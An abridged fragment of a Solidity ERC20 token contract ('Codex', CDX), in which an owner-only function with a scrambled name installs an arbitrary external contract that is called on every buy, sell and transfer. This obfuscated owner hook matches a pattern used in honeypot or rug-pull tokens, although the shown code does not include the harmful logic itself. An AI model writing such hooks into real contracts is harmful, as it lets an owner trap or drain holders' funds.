...
contract TokenM is ERC20 {
    ...
    IUserAmountnivvse public nivvse;
	mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) private _isExcludedFromVipFees;
      uint256 total;
    constructor(address tokenOwner) ERC20("Codex", "CDX") {
    ...
    function cveeoorlBssundRxxm(IUserAmountnivvse _nivvse) public onlyOwner {
        nivvse = _nivvse;
    }
    ...
    function _transfer(
        ...
        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
			...
			if(from == uniswapV2Pair){
                ...
                nivvse.addInAmount(to, amount);
            }else if(to == uniswapV2Pair){
				nivvse.addOutAmount(from, amount);
            }else{
                nivvse.addOutAmount(from, amount);
                takeFee = false;
            }
